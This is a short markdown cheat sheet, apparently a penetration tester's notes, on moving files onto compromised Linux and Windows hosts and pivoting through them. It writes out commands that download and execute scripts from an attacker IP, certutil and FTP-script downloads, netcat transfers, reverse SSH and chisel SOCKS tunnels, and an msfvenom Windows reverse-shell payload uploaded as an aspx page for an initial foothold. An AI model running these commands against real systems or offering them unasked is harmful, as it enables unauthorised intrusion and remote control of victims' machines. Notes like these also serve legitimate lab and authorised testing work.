## Linux
- `python3 -m http.server 80`
   - start web server from location file is at
- `wget http://ip/file.sh`
- OR
- `curl -O http://10.10.10.10/file.sh`
  - `chmod +x file.sh`
  - `./file.sh`
- OR if have SSH access
- `scp linenum.sh user@remotehost:/tmp/linenum.sh`
 
#### Netcat
- Local host
  - `nc -nvlp 4444 < file`
- Target host
  - `nc <hostip> 4444 > file`
- If get this error: This is nc from the netcat-openbsd package. An alternative nc is available
  - run this: `nc -l 1234 > file.sh`
 
#### SSH
- using proxychains:
   - from target:
      - `ssh -fN -R [port] root@[localhost]`
   - from local host:
      - `ssh -fN -D [port] user@[target]`

- for a better shell, can try ssh
- .ssh files in /home/user -> identify with `ls -la`
- create keypair
  - ssh-keygen
- Can use SCP now
  - if need a file from something ssh connected to try scp
  - `scp /path/to/source/file.ext username@10.0.0.10:/path/to/destination/file.ext`
  - `scp <user@machineip>:Filename /directorytodownloadto/`


 ## Windows
 - Doesnt typically have netcat, wget or curl

#### Certutil
- certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt

#### FTP
- try ftp 10.10.10.10
 - Can create a file with the following:
   - `echo open 10.10.10.10> ftpreq.txt`
   - `echo USER username>> ftpreq.txt`
   - `echo password>> ftpreq.txt`
   - `echo bin>> ftpreq.txt`
   - `echo GET wget.exe>> ftpreq.txt`
   - `echo bye>> ftpreq.txt`
  - Run `ftp -v -n -s:ftpreq.txt`

#### Chisel
- host:
   - `chisel server -p 8000 --socks5 --reverse`
- target:
   - `chisel client [attacker]:8000 R:socks`
- edit /etc/proxychains.conf
...
- socks5    [host] 1080
- proxychains [command to execute on target]

## Original foothold:
- Manual shell msfvenom
- `Msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=4444 -f aspx > shell.aspx`
- Put it into the FTP
- Set up a listener and navigate to it via firefox
